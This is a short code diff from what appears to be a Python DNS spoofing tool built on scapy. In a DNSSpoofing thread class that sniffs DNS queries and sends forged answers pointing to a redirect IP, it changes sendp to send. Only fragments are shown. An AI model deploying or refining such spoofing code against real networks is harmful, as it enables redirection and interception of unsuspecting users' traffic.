@@ -1,7 +1,7 @@
 from scapy import packet
 from scapy.layers.dns import DNSRR, DNSQR, DNS
 from scapy.layers.inet import IP, UDP
-from scapy.sendrecv import sendp, sniff
+from scapy.sendrecv import send, sniff
 import threading
 
 
@@ -72,7 +72,7 @@ class DNSSpoofing(threading.Thread):
 
             spoofed_ans = create_spoofed_dns_answer(self.redirect_ip, received_packet)
             # TODO: Set verbose to false or make it configurable
-            sendp(spoofed_ans, iface=self.interface, verbose=True)
+            send(spoofed_ans, iface=self.interface, verbose=True)
             print(f"Spoofed DNS request sent by host {received_packet[IP].src} for "
                   f"{received_packet[DNSQR].qname.decode('utf8')[:-1]}")
 
